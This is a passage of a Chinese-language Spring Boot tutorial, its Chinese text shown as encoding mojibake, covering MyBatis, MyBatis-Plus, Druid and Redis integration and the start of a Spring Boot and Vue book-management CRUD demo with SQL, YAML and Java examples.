5è®¾è®¡æ¨¡å¼', 'è®¡ç®—æœºç†è®º', 'æ·±å…¥Springæºç å‰–æSpringæºç ä¸­è•´å«çš„10å¤§è®¾è®¡æ¨¡å¼');\nINSERT INTO `tbl_book` VALUES (4, 'Spring MVC+ MyBatiså¼€å‘ä»å…¥é—¨åˆ°é¡¹ç›®å®æˆ˜', 'è®¡ç®—æœºç†è®º', 'å…¨æ–¹ä½è§£æé¢å‘Webåº”ç”¨çš„è½»é‡çº§æ¡†æ¶,å¸¦ä½ æˆä¸ºSpring MVCå¼€å‘é«˜æ‰‹');\nINSERT INTO `tbl_book` VALUES (5, 'è½»é‡çº§Java Webä¼ä¸šåº”ç”¨å®æˆ˜', 'è®¡ç®—æœºç†è®º', 'æºç çº§å‰–æSpringæ¡†æ¶,é€‚åˆå·²æŒæ¡JavaåŸºç¡€çš„è¯»è€…');\nINSERT INTO `tbl_book` VALUES (6, 'Javaæ ¸å¿ƒæŠ€æœ¯å·|åŸºç¡€çŸ¥è¯†(åŸä¹¦ç¬¬11ç‰ˆ)', 'è®¡ç®—æœºç†è®º', 'Core Javaç¬¬11ç‰ˆï¼ŒJoltå¤§å¥–è·å¥–ä½œå“ï¼Œé’ˆå¯¹Java SE9ã€10ã€ 11å…¨é¢æ›´æ–°');\nINSERT INTO `tbl_book` VALUES (7, 'æ·±å…¥ç†è§£Javaè™šæ‹Ÿæœº', 'è®¡ç®—æœºç†è®º', '5ä¸ªç»´åº¦å…¨é¢å‰–æJVM,é¢è¯•çŸ¥è¯†ç‚¹å…¨è¦†ç›–');\nINSERT INTO `tbl_book` VALUES (8, 'Javaç¼–ç¨‹æ€æƒ³(ç¬¬4ç‰ˆ)', 'è®¡ç®—æœºç†è®º', 'Javaå­¦ä¹ å¿…è¯»ç»å…¸æ®¿å ‚çº§è‘—ä½œ!èµ¢å¾—äº†å…¨çƒç¨‹åºå‘˜çš„å¹¿æ³›èµèª‰');\nINSERT INTO `tbl_book` VALUES (9, 'é›¶åŸºç¡€å­¦Java (å…¨å½©ç‰ˆ)', 'è®¡ç®—æœºç†è®º', 'é›¶åŸºç¡€è‡ªå­¦ç¼–ç¨‹çš„å…¥é—¨]å›¾ä¹¦ï¼Œç”±æµ…å…¥æ·±ï¼Œè¯¦è§£Javaè¯­è¨€çš„ç¼–ç¨‹æ€æƒ³å’Œæ ¸å¿ƒæŠ€æœ¯');\nINSERT INTO `tbl_book` VALUES (10, 'ç›´æ’­å°±è¯¥è¿™ä¹ˆåš:ä¸»æ’­é«˜æ•ˆæ²Ÿé€šå®æˆ˜æŒ‡å—', 'å¸‚åœºè¥é”€', 'æå­æŸ’ã€æä½³ç¦ã€è–‡å¨…æˆé•¿ä¸ºç½‘çº¢çš„ç§˜å¯†éƒ½åœ¨ä¹¦ä¸­');\nINSERT INTO `tbl_book` VALUES (11, 'ç›´æ’­é”€è®²å®æˆ˜ä¸€æœ¬é€š', 'å¸‚åœºè¥é”€', 'å’Œç§‹å¶ä¸€èµ·å­¦ç³»åˆ—ç½‘ç»œè¥é”€ä¹¦ç±');\nINSERT INTO `tbl_book` VALUES (12, 'ç›´æ’­å¸¦è´§:æ·˜å®ã€å¤©çŒ«ç›´æ’­ä»æ–°æ‰‹åˆ°é«˜æ‰‹', 'å¸‚åœºè¥é”€', 'ä¸€æœ¬æ•™ä½ å¦‚ä½•ç©è½¬ç›´æ’­çš„ä¹¦ï¼Œ 10å ‚è¯¾è½»æ¾å®ç°å¸¦è´§æœˆå…¥3W+');\nINSERT INTO `tbl_book` VALUES (13, 'Springå®æˆ˜ç¬¬5ç‰ˆ', 'è®¡ç®—æœºç†è®º', 'Springå…¥é—¨ç»å…¸æ•™ç¨‹,æ·±å…¥ç†è§£SpringåŸç†æŠ€æœ¯å†…å¹•');\nINSERT INTO `tbl_book` VALUES (14, 'Spring 5æ ¸å¿ƒåŸç†ä¸30ä¸ªç±»æ‰‹å†™å®æˆ˜', 'è®¡ç®—æœºç†è®º', 'åå¹´æ²‰æ·€ä¹‹ä½œï¼Œå†™Springç²¾åæ€æƒ³');\n\nSET FOREIGN_KEY_CHECKS = 1;\n```\n\n- å®ä½“ç±»\n\n```java\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\n- æ˜ å°„æ¥å£ï¼ˆDaoï¼‰\n\n```java\n@Mapper\npublic interface BookDao {\n    @Select(\"select * from tbl_book where id = #{id}\")\n    public Book getById(Integer id);\n}\n```\n\n- æµ‹è¯•ç±»\n\n```java\n@SpringBootTest\nclass Springboot05MybatisApplicationTests {\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        System.out.println(bookDao.getById(1));\n    }\n}\n```\n\n**æ€»ç»“**\n\n1. æ•´åˆæ“ä½œéœ€è¦å‹¾é€‰MyBatisæŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥MyBatiså¯¹åº”çš„starter\n\n2. æ•°æ®åº“è¿æ¥ç›¸å…³ä¿¡æ¯è½¬æ¢æˆé…ç½®\n\n3. æ•°æ®åº“SQLæ˜ å°„éœ€è¦æ·»åŠ @Mapperè¢«å®¹å™¨è¯†åˆ«åˆ°\n\n4. MySQL 8.Xé©±åŠ¨å¼ºåˆ¶è¦æ±‚è®¾ç½®æ—¶åŒº\n\n   - ä¿®æ”¹urlï¼Œæ·»åŠ serverTimezoneè®¾å®š\n   - ä¿®æ”¹MySQLæ•°æ®åº“é…ç½®ï¼šä¿®æ”¹mysqlä¸­çš„é…ç½®æ–‡ä»¶mysql.iniï¼Œåœ¨mysqldé¡¹ä¸­æ·»åŠ default-time-zone=+8:00\n\n5. é©±åŠ¨ç±»è¿‡æ—¶ï¼Œæé†’æ›´æ¢ä¸ºcom.mysql.cj.jdbc.Driver\n\n## 3.æ•´åˆMyBatis-Plus\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥å¯¹åº”çš„ starter å’Œæ•°æ®åº“é©±åŠ¨\n\n```xml\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>3.4.3</version>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <scope>runtime</scope>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šé…ç½®æ•°æ®æºç›¸å…³ä¿¡æ¯\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/ssm_db\n    username: root\n    password: root\n```\n\n**æ­¥éª¤â‘¢**ï¼šé…ç½®è¡¨åçš„é€šç”¨å‰ç¼€å\n\næ•°æ®åº“çš„è¡¨åå®šä¹‰è§„åˆ™æ˜¯tbl_æ¨¡å—åç§°ï¼Œä¸ºäº†èƒ½å’Œå®ä½“ç±»ç›¸å¯¹åº”ï¼Œéœ€è¦è®¾ç½®æ‰€æœ‰è¡¨åçš„é€šç”¨å‰ç¼€å\n\n```yaml\nmybatis-plus:\n  global-config:\n    db-config:\n      table-prefix: tbl_\t\t#è®¾ç½®æ‰€æœ‰è¡¨çš„é€šç”¨å‰ç¼€åç§°ä¸ºtbl_\n```\n\n**æ­¥éª¤â‘£**ï¼šé…ç½®è¿è¡Œæ—¥å¿—\n\nä½¿ç”¨MPåå¼€å‘è€…ä¸éœ€è¦ä¹¦å†™SQLè¯­å¥äº†ï¼Œè¿™æ ·ç¨‹åºè¿è¡Œçš„æ—¶å€™æ€»æœ‰ä¸€ç§æ„Ÿè§‰ï¼Œä¸€åˆ‡çš„ä¸€åˆ‡éƒ½æ˜¯é»‘ç›’çš„ï¼Œä½œä¸ºå¼€å‘è€…æˆ‘ä»¬å•¥ä¹Ÿä¸çŸ¥é“å°±å®Œäº†ã€‚å¦‚æœç¨‹åºæ­£å¸¸è¿è¡Œè¿˜å¥½ï¼Œå¦‚æœæŠ¥é”™äº†ï¼Œè¿™ä¸ªæ—¶å€™å°±å¾ˆå´©æºƒï¼Œä½ ç”šè‡³éƒ½ä¸çŸ¥é“ä»ä½•ä¸‹æ‰‹ï¼Œå› ä¸ºä¼ é€’å‚æ•°ã€å°è£…SQLè¯­å¥è¿™äº›æ“ä½œå®Œå…¨ä¸æ˜¯ä½ å¹²é¢„å¼€å‘å‡ºæ¥çš„ï¼Œæ‰€ä»¥æŸ¥çœ‹æ‰§è¡ŒæœŸè¿è¡Œçš„SQLè¯­å¥å°±æˆä¸ºå½“åŠ¡ä¹‹æ€¥ã€‚SpringBootæ•´åˆMPçš„æ—¶å€™å……åˆ†è€ƒè™‘åˆ°äº†è¿™ç‚¹ï¼Œé€šè¿‡é…ç½®çš„å½¢å¼å°±å¯ä»¥æŸ¥é˜…æ‰§è¡ŒæœŸSQLè¯­å¥ï¼Œé…ç½®å¦‚ä¸‹\n\n```yaml\nmybatis-plus:\n  global-config:\n    db-config:\n      table-prefix: tbl_\n      id-type: auto\n  configuration:\n    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl #é…ç½®æ—¥å¿—\n```\n\n**æµ‹è¯•**\n\n- å®ä½“ç±»\n\n```java\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\n- æ˜ å°„æ¥å£ï¼ˆDaoï¼‰\n\n```java\n@Mapper\npublic interface BookDao extends BaseMapper<Book> {\n}\n```\n\næ ¸å¿ƒåœ¨äºDaoæ¥å£ç»§æ‰¿äº†ä¸€ä¸ªBaseMapperçš„æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä¸­å¸®åŠ©å¼€å‘è€…é¢„å®šäº†è‹¥å¹²ä¸ªå¸¸ç”¨çš„APIæ¥å£ï¼Œç®€åŒ–äº†é€šç”¨APIæ¥å£çš„å¼€å‘å·¥ä½œã€‚\n\n- æµ‹è¯•ç±»\n\n```java\n@SpringBootTest\nclass SpringbootApplicationTests {\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        System.out.println(bookDao.selectById(2));\n        System.out.println(bookDao.selectList(null));\n    }\n}\n```\n\n**æ€»ç»“**\n\n1. æ‰‹å·¥æ·»åŠ MyBatis-Pluså¯¹åº”çš„starter\n2. æ•°æ®å±‚æ¥å£ä½¿ç”¨BaseMapperç®€åŒ–å¼€å‘\n3. å€ŸåŠ©MyBatis-Plusæ—¥å¿—å¯ä»¥æŸ¥é˜…æ‰§è¡ŒSQLè¯­å¥\n4. éœ€è¦ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹æŠ€æœ¯æ— æ³•é€šè¿‡å‹¾é€‰ç¡®å®šæ—¶ï¼Œéœ€è¦æ‰‹å·¥æ·»åŠ åæ ‡\n\n## 4.æ•´åˆDurid\n\nå‰é¢æ•´åˆ MyBatis å’Œ MyBatis-Plus çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ•°æ®æºå¯¹è±¡éƒ½æ˜¯SpringBooté»˜è®¤çš„æ•°æ®æºå¯¹è±¡ HiKariï¼Œä¸‹é¢æˆ‘ä»¬æ‰‹å·¥æ§åˆ¶ä¸€ä¸‹ï¼Œè‡ªå·±æŒ‡å®šäº†ä¸€ä¸ªæ•°æ®æºå¯¹è±¡ Druidã€‚\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥å¯¹åº”çš„starter\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>com.alibaba</groupId>\n        <artifactId>druid-spring-boot-starter</artifactId>\n        <version>1.2.6</version>\n    </dependency>\n</dependencies>\n```\n\n**æ­¥éª¤â‘¡**ï¼šä¿®æ”¹é…ç½®\n\n```yaml\nspring:\n  datasource:\n    druid:\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n      username: root\n      password: root\n      \n#é™¤äº†è¿™4ä¸ªå¸¸è§„é…ç½®å¤–ï¼Œè¿˜æœ‰druidä¸“ç”¨çš„å…¶ä»–é…ç½®ã€‚é€šè¿‡æç¤ºåŠŸèƒ½å¯ä»¥æ‰“å¼€druidç›¸å…³çš„é…ç½®æŸ¥é˜…\n```\n\n**æ€»ç»“**\n\n1. æ•´åˆDruidéœ€è¦å¯¼å…¥Druidå¯¹åº”çš„starter\n2. æ ¹æ®Druidæä¾›çš„é…ç½®æ–¹å¼è¿›è¡Œé…ç½®\n\n## 5.æ•´åˆRedis\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥å¯¹åº”çš„starter å’Œä¾èµ–\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n\n<!--è¿æ¥æ± ä¾èµ–-->\n<dependency>\n  <groupId>org.apache.commons</groupId>\n  <artifactId>commons-pool2</artifactId>\n  <version>2.6.0</version>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šä¿®æ”¹é…ç½®\n\n```yaml\nspring:\n  redis:\n    host: 127.0.0.1 #æŒ‡å®šredisæ‰€åœ¨çš„host\n    port: 6379  #æŒ‡å®šredisçš„ç«¯å£\n    password: 123456  #è®¾ç½®rediså¯†ç \n    lettuce:\n      pool:\n        max-active: 8 #æœ€å¤§è¿æ¥æ•°\n        max-idle: 8 #æœ€å¤§ç©ºé—²æ•°\n        min-idle: 0 #æœ€å°ç©ºé—²æ•°\n        max-wait: 100ms #è¿æ¥ç­‰å¾…æ—¶é—´\n```\n\n**æµ‹è¯•**\n\n```java\n@SpringBootTest\nclass SpringRedisApplicationTests {\n    @Resource\n    private RedisTemplate redisTemplate;\n    @Test\n    void testString() {\n        // 1.é€šè¿‡RedisTemplateè·å–æ“ä½œStringç±»å‹çš„ValueOperationså¯¹è±¡\n        ValueOperations ops = redisTemplate.opsForValue();\n        // 2.æ’å…¥ä¸€æ¡æ•°æ®\n        ops.set(\"name\",\"jianjian\");\n        // 3.è·å–æ•°æ®\n        String name = (String) ops.get(\"name\");\n        System.out.println(\"name = \" + name);\n    }\n}\n```\n\n# äº”ã€æ•´åˆæ¡ˆä¾‹\n\n> æœ¬ç« å°†å®ç°ä¸€ä¸ªåŸºäº SpringBoot -Vue çš„ CRUD æ•´åˆ Demo\n>\n> é¡¹ç›®åœ°å€ï¼šhttps://github.com/jwt1399/SpringBoot-Vue-CRUD\n\n## 0.é¡¹ç›®ç®€ä»‹\n\n### â‘ .é¡¹ç›®å±‚æ¬¡\n\n- **entityå±‚**\n\nentityå±‚å³æ•°æ®åº“å®ä½“å±‚ï¼Œä¹Ÿç§°ä¸º POJO å±‚ï¼ˆPlain Ordinary Java Objectï¼Œå³ç®€å•æ™®é€šçš„javaå¯¹è±¡ï¼‰æˆ– model å±‚ã€‚ entityå±‚çš„ä½œç”¨ä¸ºå­˜æ”¾å®ä½“ç±»Beanã€‚ ä¸€èˆ¬æ•°æ®åº“ä¸€å¼ è¡¨å¯¹åº”ä¸€ä¸ªå®ä½“ç±»ï¼Œç±»å±æ€§åŒè¡¨å­—æ®µä¸€ä¸€å¯¹åº”ã€‚\n\n- **daoå±‚**\n\ndaoå±‚å³æ•°æ®æŒä¹…å±‚ï¼Œä¹Ÿç§°ä¸ºmapperå±‚ã€‚ daoå±‚çš„ä½œç”¨ä¸ºè®¿é—®æ•°æ®åº“ï¼Œå‘æ•°æ®åº“å‘é€sqlè¯­å¥ï¼Œå®Œæˆæ•°æ®çš„å¢åˆ æ”¹æŸ¥ä»»åŠ¡ã€‚\n\n- **serviceå±‚**\n\nserviceå±‚å³ä¸šåŠ¡é€»è¾‘å±‚ã€‚  serviceå±‚çš„ä½œç”¨ä¸ºå®ŒæˆåŠŸèƒ½è®¾è®¡ã€‚  serviceå±‚è°ƒç”¨daoå±‚æ¥å£ï¼Œæ¥æ”¶daoå±‚è¿”å›çš„æ•°æ®ï¼Œå®Œæˆé¡¹ç›®çš„åŸºæœ¬åŠŸèƒ½è®¾è®¡ã€‚\n\n- **controllerå±‚**\n\ncontrollerå±‚å³æ§åˆ¶å±‚ã€‚  controllerå±‚çš„åŠŸèƒ½ä¸ºè¯·æ±‚å’Œå“åº”æ§åˆ¶ã€‚  controllerå±‚è´Ÿè´£å‰åç«¯äº¤äº’ï¼Œæ¥å—å‰ç«¯è¯·æ±‚ï¼Œè°ƒç”¨serviceå±‚ï¼Œæ¥æ”¶serviceå±‚è¿”å›çš„æ•°æ®ï¼Œæœ€åè¿”å›å…·ä½“çš„é¡µé¢å’Œæ•°æ®åˆ°å®¢æˆ·ç«¯ã€‚\n\n![](https://img.jwt1399.top/img/202209082324008)\n\n### â‘¡.ç›¸å…³æŠ€æœ¯\n\n- Beanå¼€å‘â€”â€”â€”â€”ä½¿ç”¨`Lombok`å¿«é€Ÿåˆ¶ä½œå®ä½“ç±»\n- Daoå¼€å‘â€”â€”â€”â€”æ•´åˆ`MyBatis-Plus`ï¼Œåˆ¶ä½œæ•°æ®å±‚æµ‹è¯•\n- Serviceå¼€å‘â€”â€”â€”â€”åŸºäº`MyBatis-Plus`è¿›è¡Œå¢é‡å¼€å‘ï¼Œåˆ¶ä½œä¸šåŠ¡å±‚æµ‹è¯•ç±»\n- Controllerå¼€å‘â€”â€”â€”â€”åŸºäº`Restful`å¼€å‘ï¼Œä½¿ç”¨`PostMan`æµ‹è¯•æ¥å£åŠŸèƒ½\n- é¡µé¢å¼€å‘â€”â€”â€”â€”åŸºäº`VUE+ElementUI`åˆ¶ä½œï¼Œå‰åç«¯è”è°ƒï¼Œé¡µé¢æ•°æ®å¤„ç†ï¼Œé¡µé¢æ¶ˆæ¯å¤„ç†\n\n### â‘¢.é¡¹ç›®å±•ç¤º\n\n#### ä¸»é¡µé¢\n\n![](https://img.jwt1399.top/img/202209080000584.png)\n\n#### å¢/æ”¹\n\n![](https://img.jwt1399.top/img/202209080001120.png)\n\n#### åˆ é™¤\n\n![](https://img.jwt1399.top/img/202209080001905.png)\n\n#### æŸ¥è¯¢\n\n![](https://img.jwt1399.top/img/202209080001485.png)\n\n## 1.é¡¹ç›®åˆ›å»º\n\nåˆ›å»ºæ–°é¡¹ç›®ï¼ŒåŠ è½½è¦ä½¿ç”¨çš„æŠ€æœ¯å¯¹åº”çš„starterï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶æ ¼å¼ä¸ºymlæ ¼å¼ï¼Œå¹¶æŠŠwebè®¿é—®ç«¯å£å…ˆè®¾ç½®æˆ80ã€‚\n\n**pom.xml**\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-web</artifactId>\n</dependency>\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-test</artifactId>\n  <scope>test</scope>\n</dependency>\n\n```\n\n**application.yml**\n\n```yaml\nserver:\n  port: 80\n```\n\n## 2.å®ä½“å±‚å¼€å‘\n\n**æ•°æ®è¡¨**\n\n```sql\n-- ----------------------------\n-- Table structure for tbl_book\n-- ----------------------------\nDROP TABLE IF EXISTS `tbl_book`;\nCREATE TABLE `tbl_book`  (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `type` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = InnoDB AUTO_INCREMENT = 51 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Records of tbl_book\n-- ----------------------------\nINSERT INTO `tbl_book` VALUES (1, 'è®¡ç®—æœºç†è®º', 'Springå®æˆ˜ ç¬¬5ç‰ˆ', 'Springå…¥é—¨ç»å…¸æ•™ç¨‹ï¼Œæ·±å…¥ç†è§£SpringåŸç†æŠ€æœ¯å†…å¹•');\nINSERT INTO `tbl_book` VALUES (2, 'è®¡ç®—æœºç†è®º', 'Spring 5æ ¸å¿ƒåŸç†ä¸30ä¸ªç±»æ‰‹å†™å®æˆ˜', 'åå¹´æ²‰æ·€ä¹‹ä½œï¼Œæ‰‹å†™Springç²¾åæ€æƒ³');\nINSERT INTO `tbl_book` VALUES (3, 'è®¡ç®—æœºç†è®º', 'Spring 5 è®¾è®¡æ¨¡å¼', 'æ·±å…¥Springæºç å‰–æSpringæºç ä¸­è•´å«çš„10å¤§è®¾è®¡æ¨¡å¼');\nINSERT INTO `tbl_book` VALUES (4, 'è®¡ç®—æœºç†è®º', 'Spring MVC+MyBatiså¼€å‘ä»å…¥é—¨åˆ°é¡¹ç›®å®æˆ˜', 'å…¨æ–¹ä½è§£æé¢å‘Webåº”ç”¨çš„è½»é‡çº§æ¡†æ¶ï¼Œå¸¦ä½ æˆä¸ºSpring MVCå¼€å‘é«˜æ‰‹');\nINSERT INTO `tbl_book` VALUES (5, 'è®¡ç®—æœºç†è®º', 'è½»é‡çº§Java Webä¼ä¸šåº”ç”¨å®æˆ˜', 'æºç çº§å‰–æSpringæ¡†æ¶ï¼Œé€‚åˆå·²æŒæ¡JavaåŸºç¡€çš„è¯»è€…');\nINSERT INTO `tbl_book` VALUES (6, 'è®¡ç®—æœºç†è®º', 'Javaæ ¸å¿ƒæŠ€æœ¯ å·I åŸºç¡€çŸ¥è¯†ï¼ˆåŸä¹¦ç¬¬11ç‰ˆï¼‰', 'Core Java ç¬¬11ç‰ˆï¼ŒJoltå¤§å¥–è·å¥–ä½œå“ï¼Œé’ˆå¯¹Java SE9ã€10ã€11å…¨é¢æ›´æ–°');\nINSERT INTO `tbl_book` VALUES (7, 'è®¡ç®—æœºç†è®º', 'æ·±å…¥ç†è§£Javaè™šæ‹Ÿæœº', '5ä¸ªç»´åº¦å…¨é¢å‰–æJVMï¼Œå¤§å‚é¢è¯•çŸ¥è¯†ç‚¹å…¨è¦†ç›–');\nINSERT INTO `tbl_book` VALUES (8, 'è®¡ç®—æœºç†è®º', 'Javaç¼–ç¨‹æ€æƒ³ï¼ˆç¬¬4ç‰ˆï¼‰', 'Javaå­¦ä¹ å¿…è¯»ç»å…¸,æ®¿å ‚çº§è‘—ä½œï¼èµ¢å¾—äº†å…¨çƒç¨‹åºå‘˜çš„å¹¿æ³›èµèª‰');\nINSERT INTO `tbl_book` VALUES (9, 'è®¡ç®—æœºç†è®º', 'é›¶åŸºç¡€å­¦Javaï¼ˆå…¨å½©ç‰ˆï¼‰', 'é›¶åŸºç¡€è‡ªå­¦ç¼–ç¨‹çš„å…¥é—¨å›¾ä¹¦ï¼Œç”±æµ…å…¥æ·±ï¼Œè¯¦è§£Javaè¯­è¨€çš„ç¼–ç¨‹æ€æƒ³å’Œæ ¸å¿ƒæŠ€æœ¯');\nINSERT INTO `tbl_book` VALUES (10, 'å¸‚åœºè¥é”€', 'ç›´æ’­å°±è¯¥è¿™ä¹ˆåšï¼šä¸»æ’­é«˜æ•ˆæ²Ÿé€šå®æˆ˜æŒ‡å—', 'æå­æŸ’ã€æä½³ç¦ã€è–‡å¨…æˆé•¿ä¸ºç½‘çº¢çš„ç§˜å¯†éƒ½åœ¨ä¹¦ä¸­');\nINSERT INTO `tbl_book` VALUES (11, 'å¸‚åœºè¥é”€', 'ç›´æ’­é”€è®²å®æˆ˜ä¸€æœ¬é€š', 'å’Œç§‹å¶ä¸€èµ·å­¦ç³»åˆ—ç½‘ç»œè¥é”€ä¹¦ç±');\nINSERT INTO `tbl_book` VALUES (12, 'å¸‚åœºè¥é”€', 'ç›´æ’­å¸¦è´§ï¼šæ·˜å®ã€å¤©çŒ«ç›´æ’­ä»æ–°æ‰‹åˆ°é«˜æ‰‹', 'ä¸€æœ¬æ•™ä½ å¦‚ä½•ç©è½¬ç›´æ’­çš„ä¹¦ï¼Œ10å ‚è¯¾è½»æ¾å®ç°å¸¦è´§æœˆå…¥3W+');\n```\n\n**å®ä½“ç±»**\n\n```java\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\nå®ä½“ç±»çš„å¼€å‘å¯ä»¥æ‰‹å·¥ç”Ÿæˆget/setæ–¹æ³•ï¼Œç„¶åè¦†ç›–toString()æ–¹æ³•ã€‚ä¸è¿‡è¿™ä¸€å¥—æ“ä½œä¹¦å†™å¾ˆç¹çï¼Œå¯ä»¥ä½¿ç”¨ `Lombok`ç®€åŒ–JavaBeanå¼€å‘ã€‚\n\nå¼•å…¥ Lombokï¼Œç”¨æ³¨è§£ä»£æ›¿æ„é€ å™¨ã€getter/setterã€toString()ç­‰ä»£ç ï¼Œæ–°ç‰ˆ IDEA å·²é›†æˆ Lombok æ’ä»¶ï¼Œæ— éœ€ä¸‹è½½\n\n```xml\n<dependency>\n  <groupId>org.projectlombok</groupId>\n  <artifactId>lombok</artifactId>\n</dependency>\n```\n\n- @Data ï¼š æ³¨åœ¨ç±»ä¸Šï¼Œæä¾›ç±»çš„getã€setã€equalsã€hashCodeã€toStringç­‰æ–¹æ³•\n\n- @AllArgsConstructor ï¼šæ³¨åœ¨ç±»ä¸Šï¼Œæä¾›ç±»çš„å…¨å‚æ„é€ \n\n- @NoArgsConstructor ï¼šæ³¨åœ¨ç±»ä¸Šï¼Œæä¾›ç±»çš„æ— å‚æ„é€ \n\n- @Setter ï¼šæ³¨åœ¨å±æ€§ä¸Šï¼Œæä¾› set æ–¹æ³•\n\n- @Getter ï¼šæ³¨åœ¨å±æ€§ä¸Šï¼Œæä¾› get æ–¹æ³•\n\n- @EqualsAndHashCode ï¼šæ³¨åœ¨ç±»ä¸Šï¼Œæä¾›å¯¹åº”çš„ equals å’Œ hashCode æ–¹æ³•\n\n- @Log4j/@Slf4j ï¼šæ³¨åœ¨ç±»ä¸Šï¼Œæä¾›å¯¹åº”çš„ Logger å¯¹è±¡ï¼Œå˜é‡åä¸º log\n\n```java\n//ç®€åŒ–JavaBeanå¼€å‘\n@NoArgsConstructor //æ— å‚æ„é€ \n@AllArgsConstructor //æœ‰å‚æ„é€ \n@Data\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\nLombok è¿˜å¯ä»¥ç®€åŒ–æ—¥å¿—å¼€å‘ï¼Œä¾‹å¦‚ä¸‹é¢ä»£ç \n\n```java\n@Slf4j\n@RestController\npublic class HelloController {\n    @RequestMapping(\"/hello\")\n    public String handle(@RequestParam(\"name\") String name){\n        log.info(\"è¯·æ±‚è¿›æ¥äº†....\");\n        return \"Hello, Spring Boot 2!\"+\"ä½ å¥½ï¼š\"+name;\n    }\n}\n```\n\n## 3.æ•°æ®å±‚å¼€å‘\n\n### â‘ åŸºç¡€CRUD\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥MyBatisPlusä¸Druidå¯¹åº”çš„starterï¼Œå½“ç„¶mysqlçš„é©±åŠ¨ä¸èƒ½å°‘\n\n```xml\n<dependency>\n  <groupId>com.baomidou</groupId>\n  <artifactId>mybatis-plus-boot-starter</artifactId>\n  <version>3.4.3</version>\n</dependency>\n<dependency>\n  <groupId>com.alibaba</groupId>\n  <artifactId>druid-spring-boot-starter</artifactId>\n  <version>1.2.6</version>\n</dependency>\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <scope>runtime</scope>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šé…ç½®æ•°æ®åº“è¿æ¥ç›¸å…³çš„æ•°æ®æºé…ç½®\n\n```yaml\nspring:\n  datasource:\n    druid:\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=Asia/Shanghai\n      username: root\n      password: root\n```\n\n**æ­¥éª¤â‘¢**ï¼šé…ç½®MPç›¸å…³é…ç½®\n\n- è¡¨åé€šç”¨å‰ç¼€\n- ä¸»é”®ç”Ÿæˆç­–ç•¥\n  - MPæŠ€æœ¯é»˜è®¤çš„ä¸»é”®ç”Ÿæˆç­–ç•¥ä¸ºé›ªèŠ±ç®—æ³•ï¼Œç”Ÿæˆçš„ä¸»é”®IDé•¿åº¦è¾ƒå¤§ï¼Œå’Œç›®å‰çš„æ•°æ®åº“è®¾å®šè§„åˆ™ä¸ç›¸ç¬¦ï¼Œéœ€è¦é…ç½®ä¸€ä¸‹ä½¿MPä½¿ç”¨æ•°æ®åº“çš„ä¸»é”®ç”Ÿæˆç­–ç•¥\n- é…ç½®MPæ—¥å¿—\n  - è®¾ç½®æ—¥å¿—è¾“å‡ºæ–¹å¼ä¸ºæ ‡å‡†è¾“å‡ºå³å¯æŸ¥é˜…SQLæ‰§è¡Œæ—¥å¿—\n\n```yaml\nmybatis-plus:\n  global-config:\n    db-config:\n      table-prefix: tbl_\t\t#è®¾ç½®è¡¨åé€šç”¨å‰ç¼€\n      id-type: auto\t\t\t\t#è®¾ç½®ä¸»é”®idå­—æ®µçš„ç”Ÿæˆç­–ç•¥ä¸ºå‚ç…§æ•°æ®åº“è®¾å®šçš„ç­–ç•¥ï¼Œå½“å‰æ•°æ®åº“è®¾ç½®idç”Ÿæˆç­–ç•¥ä¸ºè‡ªå¢\n  configuration:\n    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl  #é…ç½®æ ‡å‡†è¾“å‡ºæ—¥å¿—\n```\n\n**æ­¥éª¤â‘£**ï¼šä½¿ç”¨MPçš„æ ‡å‡†é€šç”¨æ¥å£BaseMapperåŠ é€Ÿå¼€å‘ï¼Œåˆ«å¿˜äº†@Mapperå’Œæ³›å‹çš„æŒ‡å®š\n\n```java\n@Mapper\npublic interface BookDao extends BaseMapper<Book> 